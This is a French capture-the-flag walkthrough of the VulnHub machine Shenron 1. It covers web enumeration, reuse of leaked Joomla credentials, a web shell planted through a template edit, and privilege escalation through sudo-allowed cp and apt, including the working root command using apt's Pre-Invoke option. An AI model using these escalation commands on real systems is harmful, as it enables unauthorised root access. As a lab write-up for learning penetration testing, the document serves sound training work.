# Solution du CTF Shenron 1 de VulnHub

[shenron: 1](https://vulnhub.com/entry/shenron-1,630/) fait partie d'une série de CTFs proposée sur VulnHub et créé par [@shubhammandloi](https://twitter.com/shubhammandloi).

```
Nmap scan report for 192.168.56.60
Host is up (0.00018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0e22600af7d478f64208d76a6bb0b162 (RSA)
|   256 b30ccd0a67c3abd22327021fb2fb9112 (ECDSA)
|_  256 2973e0f26df6fbde4c6fb27a1969f582 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu
```

## Comme une lettre à la poste

Le site web fournit directement la page par défaut d'Apache donc on attaque directement avec l'énumération web.

Je trouve déjà des identifiants dans un dossier `test` :

```html
$ curl http://192.168.56.60/test/password
<!DOCTYPE html>
<html>
<head>
        <title>PASSWORD</title>
</head>
<body>
        <h1>LOTS OF INFORMATION ARE HERE ;-)</h1>


        <h1> You Are Very Near .......</h4>

        <!--
         "All The Best"
         Credentials:- "admin:3iqtzi4RhkWANcu@$pa$$"

         --> 
</body>
</html>
```

Et deuxièmement un Joomla installé à l'adresse `/joomla` (tout simplement)

Il faut se rendre sur `/joomla/administrator` pour accèder au panel d'administration.

On ne croise pas du Joomla très régulièrement sur les CTFs. Heureusement j'ai déjà eu le cas sur le CTF [Rosee de Wizard Labs](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Rosee%20de%20Wizard%20Labs.md#its-all-about-osint-you-fool) par conséquent je me suivre le même cheminement pour éditer le template par défaut et ajouter un fichier PHP qui me donnera mon shell web.

Transformé à peine une minute plus tard en beau reverse shell avec PTY, j'en profite pour regarder dans `/etc/passwd` :

```
jenny:x:1001:1001::/home/jenny:/bin/bash
shenron:x:1002:1002::/home/shenron:/bin/bash
```

## Jenny! Jenny! Jenny!

Quand je recherche les fichier de jenny je ne trouve que son dossier personnel et le fichier `/var/www/html/joomla/htaccess.txt`. Ce dernier ne contient rien d'intéressant (juste des règles d'URL rewriting).

Pour shenron il y a un fichier sans doute intéressant mais non lisible pour le moment :

`-rwx------ 1 shenron shenron 43 Dec 13  2020 /var/opt/password.txt`

Dans le fichier de configuration de Joomla je trouve des infos prometteuses :

```php
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'jenny';
        public $password = 'Mypa$$wordi$notharD@123';
        public $db = 'joomla_db';
        public $dbprefix = 'sotv8_';
        public $live_site = '';
        public $secret = '3xAUrgQhKGZjsund';
```

Je zappe directement l'étape MySQL et j'utilise les identifiants qui marchent pour un `su jenny`.

De là je remarque que je peux exécuter une commande en tant que shenron :

```shellsession
jenny@shenron:~$ sudo -l
Matching Defaults entries for jenny on shenron:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on shenron:
    (shenron) NOPASSWD: /usr/bin/cp
```

Je ne peux pas exploiter la situation pour récupérer le fichier password :

```shellsession
jenny@shenron:~$ sudo -u shenron /usr/bin/cp /var/opt/password.txt /tmp/
jenny@shenron:~$ cat /tmp/password.txt 
cat: /tmp/password.txt: Permission denied
jenny@shenron:~$ ls -al /tmp/password.txt
-rwx------ 1 shenron shenron 43 Nov 17 21:23 /tmp/password.txt
```

On peut passer outre en indiquant de ne pas préserver les permissions du fichier :

```shellsession
jenny@shenron:~$ sudo -u shenron /usr/bin/cp --no-preserve=mode /var/opt/password.txt /tmp/password2.txt
jenny@shenron:~$ ls -al /tmp/password2.txt 
-rw-rw-r-- 1 shenron shenron 43 Nov 17 21:26 /tmp/password2.txt
jenny@shenron:~$ cat /tmp/password2.txt
shenron : YoUkNowMyPaSsWoRdIsToStRoNgDeAr
```

Depuis l'utilisateur shenron je peux obtenir le premier flag :

```shellsession
shenron@shenron:~$ cat local.txt 
098bf43cc909e1f89bb4c910bd31e1d4
```

## Say cAPTain, say wot

Let's go pour un GTFObins ?

```shellsession
shenron@shenron:~$ sudo -l
[sudo] password for shenron: 
Matching Defaults entries for shenron on shenron:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shenron may run the following commands on shenron:
    (ALL : ALL) /usr/bin/apt
```

GTFObins a [plusieurs astuces pour apt](https://gtfobins.github.io/gtfobins/apt/) mais certaines semblent nécessiter une connexion à Internet et la VM est configurée en host only. La dernière fonctionne correctement ici : 

```shellsession
shenron@shenron:~$ sudo /usr/bin/apt update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
                                                               
  mmmm  #                                                mmm   
 #"   " # mm    mmm   m mm    m mm   mmm   m mm            #   
 "#mmm  #"  #  #"  #  #"  #   #"  " #" "#  #"  #           #   
     "# #   #  #""""  #   #   #     #   #  #   #   """     #   
 "mmm#" #   #  "#mm"  #   #   #     "#m#"  #   #         mm#mm 
                                                               
Your Root Flag Is Here :- aa087b2d466cd593622798c8e972bffb



If You Like This Machine Follow Me On Twitter..
Twitter Handle:-    https://twitter.com/shubhammandloi or @shubhammandloi
```

Ce fut très rapide :p
